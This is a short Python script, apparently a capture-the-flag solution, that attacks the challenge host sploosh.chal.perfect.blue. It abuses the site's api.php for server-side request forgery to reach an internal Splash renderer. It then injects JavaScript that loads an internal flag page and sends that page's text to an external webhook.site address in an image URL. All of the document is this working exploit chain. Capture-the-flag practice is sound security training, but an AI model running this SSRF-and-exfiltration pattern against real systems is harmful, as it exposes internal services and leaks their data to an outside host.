import requests
from urllib import quote

js = """
var img = new Image(1, 1);
img.src = "https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?flag=" + document.body.textContent;
document.body.append(img);
""".replace('\n', '').rstrip()

tmp = 'http://splash:8050/render.html?js_source=' + quote(js) + '&url=http://172.16.0.14/flag.php'
url = 'http://sploosh.chal.perfect.blue/api.php?url=' + quote(tmp)
response = requests.get(url)
print(response.text)